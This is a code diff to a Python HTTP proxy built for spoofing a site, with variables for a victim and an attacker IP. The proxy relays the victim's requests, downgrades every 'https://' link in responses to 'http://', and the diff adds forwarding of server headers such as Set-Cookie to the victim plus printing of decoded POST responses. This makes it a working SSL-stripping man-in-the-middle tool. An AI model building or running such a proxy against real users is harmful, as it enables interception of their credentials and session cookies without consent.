@@ -8,14 +8,25 @@ site_to_spoof = None
 ip_victim = None
 ip_attacker = None
 
-# TODO: Forward (non encryption related) headers from server to victim.
-
 # Custom HTTP request handler that only allows requests from the victim.
 class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
 
     def __init__(self, *args, **kwargs):
         self.s = requests.Session()
         self.s.max_redirects = 30
+        # TODO: Forward (non encryption related) headers from server to victim.
+        self.server_client_headers_to_keep = [    
+            "X-Frame-Options",
+            # "Transfer-Encoding",
+            "P3P",
+            "X-XSS-Protection",
+            "Content-Type",
+            "Set-Cookie",
+            "Expires",
+            # "Content-Encoding",
+            "Date",
+            "Cache-Control",
+        ]
         super().__init__(*args, **kwargs)
 
     def do_GET(self):
@@ -44,6 +55,10 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
 
             # Send the response back to the client
             self.send_response(response.status_code)
+
+            for key, value in response.headers.items():
+                if key in self.server_client_headers_to_keep:
+                    self.send_header(key, value)
 
             self.end_headers()
             self.wfile.write(response_content)
@@ -81,11 +96,18 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
             # Replace all "https://" with "http://"
             try:
                 response_content = response.content.decode('utf-8').replace("https://", "http://").encode('utf-8')
+                print(response.content.decode('utf-8'))
             except UnicodeDecodeError:
                 response_content = response.content.replace(b"https://", b"http://")
 
+            print("COMPLETED POST")
+
             # Send the response back to the client
             self.send_response(response.status_code)
+
+            for key, value in response.headers.items():
+                if key in self.server_client_headers_to_keep:
+                    self.send_header(key, value)
 
             self.end_headers()
             self.wfile.write(response_content)
